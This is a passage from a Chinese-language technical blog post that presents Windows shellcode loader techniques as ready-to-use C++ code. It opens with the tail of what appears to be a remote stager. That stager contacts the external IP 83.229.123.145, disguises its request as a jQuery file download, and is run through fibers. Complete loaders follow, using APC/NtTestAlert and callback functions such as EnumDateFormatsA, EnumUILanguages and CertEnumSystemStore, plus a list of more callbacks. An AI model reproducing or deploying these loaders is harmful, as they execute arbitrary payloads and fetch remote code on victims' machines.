xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xb3\xe9\xe4\x01\x00\x00\xe8\x82\xff\xff\xff\x2f\x6a\x71\x75\x65\x72\x79\x2d\x33\x2e\x33\x2e\x32\x2e\x73\x6c\x69\x6d\x2e\x6d\x69\x6e\x2e\x6a\x73\x00\x0c\xd9\x1c\xcd\xbe\xeb\x1c\x6f\x48\x37\x3f\x6f\x06\x19\x70\x8d\x68\x13\xc8\x8c\x64\x96\x02\x10\x73\x28\xf8\x7a\x10\x40\x58\xf1\xc0\x25\x17\x16\x5b\x36\x3e\x60\x8b\x2f\x48\x1c\xdb\xe1\xa9\x65\x4d\xd5\xda\x65\xdf\x00\x41\x63\x63\x65\x70\x74\x3a\x20\x74\x65\x78\x74\x2f\x68\x74\x6d\x6c\x2c\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x78\x68\x74\x6d\x6c\x2b\x78\x6d\x6c\x0d\x0a\x41\x63\x63\x65\x70\x74\x2d\x4c\x61\x6e\x67\x75\x61\x67\x65\x3a\x20\x65\x6e\x2d\x55\x53\x2c\x65\x6e\x3b\x71\x3d\x30\x2e\x35\x0d\x0a\x52\x65\x66\x65\x72\x65\x72\x3a\x20\x68\x74\x74\x70\x3a\x2f\x2f\x63\x6f\x64\x65\x2e\x6a\x71\x75\x65\x72\x79\x2e\x63\x6f\x6d\x2f\x0d\x0a\x41\x63\x63\x65\x70\x74\x2d\x45\x6e\x63\x6f\x64\x69\x6e\x67\x3a\x20\x67\x7a\x69\x70\x2c\x20\x64\x65\x66\x6c\x61\x74\x65\x0d\x0a\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x31\x30\x2e\x30\x3b\x20\x57\x69\x6e\x36\x34\x3b\x20\x78\x36\x34\x29\x20\x41\x70\x70\x6c\x65\x57\x65\x62\x4b\x69\x74\x2f\x35\x33\x37\x2e\x33\x36\x20\x28\x4b\x48\x54\x4d\x4c\x2c\x20\x6c\x69\x6b\x65\x20\x47\x65\x63\x6b\x6f\x29\x20\x43\x68\x72\x6f\x6d\x65\x2f\x31\x32\x39\x2e\x30\x2e\x30\x2e\x30\x20\x53\x61\x66\x61\x72\x69\x2f\x35\x33\x37\x2e\x33\x36\x20\x45\x64\x67\x2f\x31\x32\x39\x2e\x30\x2e\x30\x2e\x30\x0d\x0a\x00\xe0\x9d\x8c\xc8\xa2\xc1\x78\xa5\x64\x66\xfc\x40\xac\xd3\x87\x4a\x58\xaa\xf5\xfc\xc8\xd6\xc0\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\xaf\x0f\x00\x00\x50\xc3\xe8\x7f\xfd\xff\xff\x38\x33\x2e\x32\x32\x39\x2e\x31\x32\x33\x2e\x31\x34\x35\x00\x00\x01\x86\xa0&quot;</span>;</span><br><span class="line"></span><br><span class="line">	PVOID shellcodeLocation = <span class="built_in">VirtualAlloc</span>(<span class="number">0</span>, <span class="built_in">sizeof</span>(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memcpy</span>(shellcodeLocation, buf, <span class="built_in">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">	PVOID shellcodeFiber = <span class="built_in">CreateFiber</span>(<span class="literal">NULL</span>, (LPFIBER_START_ROUTINE)shellcodeLocation, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">SwitchToFiber</span>(shellcodeFiber);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	__try &#123;</span><br><span class="line">		<span class="comment">// 尝试执行可能引发异常的代码</span></span><br><span class="line">		<span class="type">int</span>* ptr = <span class="literal">nullptr</span>;</span><br><span class="line">		*ptr = <span class="number">42</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	__except (EXCEPTION_EXECUTE_HANDLER) &#123;</span><br><span class="line">		<span class="comment">// 异常处理程序,在这里执行弹窗函数</span></span><br><span class="line">		<span class="built_in">MessageBox</span>(<span class="literal">NULL</span>, <span class="string">L&quot;YES&quot;</span>, <span class="string">L&quot;Error&quot;</span>, MB_OK | MB_ICONERROR);	</span><br><span class="line">		<span class="built_in">run</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="NtTestAlert"><a href="#NtTestAlert" class="headerlink" title="NtTestAlert"></a>NtTestAlert</h2><p><code>NtTestAlert</code>是一个未公开的Win32函数,该函数的效果是如果APC队列不为空的话,其将会直接调用函数.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ntdll&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(NTAPI* pNtTestAlert)</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span>;</span><br><span class="line">	pNtTestAlert NtTestAlert = (pNtTestAlert)(<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll&quot;</span>), <span class="string">&quot;NtTestAlert&quot;</span>));</span><br><span class="line">	LPVOID lpAddress = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="built_in">sizeof</span>(buf), MEM_COMMIT, PAGE_EXECUTE);</span><br><span class="line">	<span class="built_in">WriteProcessMemory</span>(<span class="built_in">GetCurrentProcess</span>(), lpAddress, buf, <span class="built_in">sizeof</span>(buf), <span class="literal">NULL</span>);</span><br><span class="line">	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)lpAddress;</span><br><span class="line">	<span class="built_in">QueueUserAPC</span>((PAPCFUNC)apcRoutine, <span class="built_in">GetCurrentThread</span>(), <span class="number">0</span>);</span><br><span class="line">	<span class="built_in">NtTestAlert</span>();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="回调函数运行"><a href="#回调函数运行" class="headerlink" title="回调函数运行"></a>回调函数运行</h2><blockquote>
<p>在C++中，回调函数是一种通过函数指针或函数对象来实现的机制，用于将一个函数作为参数传递给另一个函数，以便在特定事件或条件触发时调用这个函数</p>
<p>想象一下，你在看一部电影，电影结束后，系统会自动播放片尾曲。这种“电影结束后播放片尾曲”的机制可以类比为回调函数。</p>
<p>工作方式</p>
<ol>
<li>函数指针：<ul>
<li>你可以把函数指针看作是指向某个函数的“地址”。</li>
<li>通过将这个“地址”传递给另一个函数，你可以在需要的时候调用原始的函数。</li>
</ul>
</li>
<li>函数对象（仿函数）：<ul>
<li>类似于函数指针，函数对象是一个可以像函数一样调用的对象。</li>
<li>通常通过重载<code>operator()</code>实现。</li>
</ul>
</li>
</ol>
</blockquote>
<h3 id="EnumDateFormatsA"><a href="#EnumDateFormatsA" class="headerlink" title="EnumDateFormatsA"></a>EnumDateFormatsA</h3><div class="tag-plugin link dis-select"><a class="link-card plain" title="" href="https://github.com/aahmad097/AlternativeShellcodeExec" target="_blank" rel="external nofollow noopener noreferrer" cardlink autofill="title,icon"><div class="left"><span class="title">https://github.com/aahmad097/AlternativeShellcodeExec</span><span class="cap link footnote">https://github.com/aahmad097/AlternativeShellcodeExec</span></div><div class="right"><div class="lazy img" data-bg="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/link/8f277b4ee0ecd.svg"></div></div></a></div>

<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">EnumDateFormatsA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="comment">// 指向应用程序定义的回调函数的指针</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in] DATEFMT_ENUMPROCA lpDateFmtEnumProc,</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="comment">// 用于指定要为其检索日期格式信息的区域设置的区域设置标识符</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in] LCID              Locale,</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="comment">// 指定日期格式的标志</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in] DWORD             dwFlags</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span>;</span><br><span class="line">    <span class="comment">// 使用VirtualAlloc 函数申请一个 shellcode字节大小的可以执行代码的内存块</span></span><br><span class="line">    LPVOID addr = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="built_in">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">        PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="comment">// 申请失败 , 退出</span></span><br><span class="line">    <span class="keyword">if</span> (addr == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 把shellcode拷贝到这块内存</span></span><br><span class="line">    <span class="built_in">memcpy</span>(addr, buf, <span class="built_in">sizeof</span>(buf));</span><br><span class="line">    <span class="comment">// 使用回调函数调用执行   </span></span><br><span class="line">    <span class="comment">// 关于EnumDateFormatsA的函数参数</span></span><br><span class="line">    <span class="comment">// 除了回调函数的指针 , 无脑强转一下 , 其他全NULL</span></span><br><span class="line">    <span class="built_in">EnumDateFormatsA</span>((DATEFMT_ENUMPROCA)addr, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="EnumUILanguages"><a href="#EnumUILanguages" class="headerlink" title="EnumUILanguages"></a>EnumUILanguages</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span>;</span><br><span class="line">    <span class="comment">// 使用VirtualAlloc 函数申请一个 shellcode字节大小的可以执行代码的内存块</span></span><br><span class="line">    LPVOID addr = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="built_in">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">        PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="comment">// 申请失败 , 退出</span></span><br><span class="line">    <span class="keyword">if</span> (addr == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 把shellcode拷贝到这块内存</span></span><br><span class="line">    <span class="built_in">memcpy</span>(addr, buf, <span class="built_in">sizeof</span>(buf));</span><br><span class="line">    <span class="comment">// 使用回调函数调用执行</span></span><br><span class="line">    <span class="built_in">EnumUILanguages</span>((UILANGUAGE_ENUMPROC)addr, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="CertEnumSystemStore"><a href="#CertEnumSystemStore" class="headerlink" title="CertEnumSystemStore"></a>CertEnumSystemStore</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Wincrypt.h&gt;</span> <span class="comment">// 需要导入</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;crypt32.lib&quot;</span>) <span class="comment">// 需要导入</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span>;</span><br><span class="line">    <span class="comment">// 使用VirtualAlloc 函数申请一个 shellcode字节大小的可以执行代码的内存块</span></span><br><span class="line">    LPVOID addr = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="built_in">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">        PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="comment">// 申请失败 , 退出</span></span><br><span class="line">    <span class="keyword">if</span> (addr == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 把shellcode拷贝到这块内存</span></span><br><span class="line">    <span class="built_in">memcpy</span>(addr, buf, <span class="built_in">sizeof</span>(buf));</span><br><span class="line">    <span class="comment">// 使用回调函数调用执行</span></span><br><span class="line">    <span class="built_in">CertEnumSystemStore</span>(CERT_SYSTEM_STORE_CURRENT_USER, <span class="literal">NULL</span>, <span class="literal">NULL</span>, (PFN_CERT_ENUM_SYSTEM_STORE)addr);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="其他回调函数"><a href="#其他回调函数" class="headerlink" title="其他回调函数"></a>其他回调函数</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">CertEnumSystemStore</span><br><span class="line">CertEnumSystemStoreLocation</span><br><span class="line">CreateThreadPoolWait</span><br><span class="line">CreateTimerQueueTimer_Tech</span><br><span class="line">CryptEnumOIDInfo</span><br><span class="line">EnumCalendarInfo</span><br><span class="line">EnumCalendarInfoEX</span><br><span class="line">EnumChildWindows</span><br><span class="line">EnumDesktopW</span><br><span class="line">EnumDesktopWindows</span><br><span class="line">EnumDirTreeW</span><br><span class="line">EnumDisplayMonitors</span><br><span class="line">EnumerateLoadedModules</span><br><span class="line">EnumFontFamiliesExW</span><br><span class="line">EnumFontFamiliesW</span><br><span class="line">EnumFontsW</span><br><span class="line">EnumUILanguages</span><br><span class="line">EnumLanguageGroupLocalesW</span><br><span class="line">EnumObjects</span><br><span class="line">EnumPageFilesW</span><br><span class="line">EnumPwrSchemes</span><br><span class="line">EnumResourceTypesExW</span><br><span class="line">EnumResourceTypesW</span><br><span class="line">EnumSystemLocalesEx</span><br><span class="line">EnumThreadWindows</span><br><span class="line">EnumTimeFormatsEx</span><br><span class="line">EnumUILanguagesW</span><br><span class="line">EnumWindows</span><br><span class="line">EnumWindowStationsW</span><br><span class="line">FiberContextEdit</span><br><span class="line">FlsAlloc</span><br><span class="line">ImageGetDigestStream</span><br><span class="line">ImmEnumInputContext</span><br><span class="line">LdrEnumerateLoadedModules</span><br><span class="line">SetTimer</span><br><span class="line">SetupCommitFileQueueW</span><br><span class="line">SymEnumProcesses</span><br></pre></td></tr></table></figure>

<h2 id="线程池回调执行-CreateThreadpoolWait"><a href="#线程池回调执行-CreateThreadpoolWait" class="headerlink" title="线程池回调执行-CreateThreadpoolWait"></a>线程池回调执行-CreateThreadpoolWait</h2><p><code>CreateThreadpoolWait</code>函数是Windows操作系统提供的一个函数,用于创建一个线程池中的等待对象,用于异步等待一个事件或资源的状态改变,一旦状态改变,线程池中的工作者线程将会被唤醒执行任务。</p>
<p>由此可以通过调用传递给<code>CreateThreadpoolWait</code>的回调函数来执行shellcode</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;threadpoolapiset.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> buf[] = <span 